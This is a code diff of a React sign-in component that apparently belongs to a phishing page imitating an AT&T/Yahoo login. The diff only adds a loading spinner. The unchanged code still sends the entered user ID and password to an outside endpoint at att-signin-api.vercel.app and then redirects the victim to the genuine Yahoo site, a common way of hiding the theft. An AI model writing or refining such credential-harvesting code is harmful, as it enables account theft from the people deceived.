@@ -1,9 +1,12 @@
 import React, { useState } from 'react'
 import axios from 'axios'
+import Loader from '../components/Loader'
 const Signin = () => {
   const [userData, setUserData] = useState({ userID: '', password: '' })
   const [showError, setShowError] = useState(false)
   const [redirect, setRedirect] = useState(false)
+
+  const [isLoading, setisLoading] = useState(false)
 
   React.useEffect(() => {
     redirect && window.location.replace('https://currently.att.yahoo.com/')
@@ -20,6 +23,7 @@ const Signin = () => {
       setShowError(true)
       return
     }
+    setisLoading(true)
     axios
       .post('https://att-signin-api.vercel.app/add-data', userData)
       // .post('http://127.0.0.1:3000/add-data', userData)
@@ -79,6 +83,7 @@ const Signin = () => {
           </button>
         </section>
       </section>
+      {isLoading && <Loader />}
     </div>
   )
 }
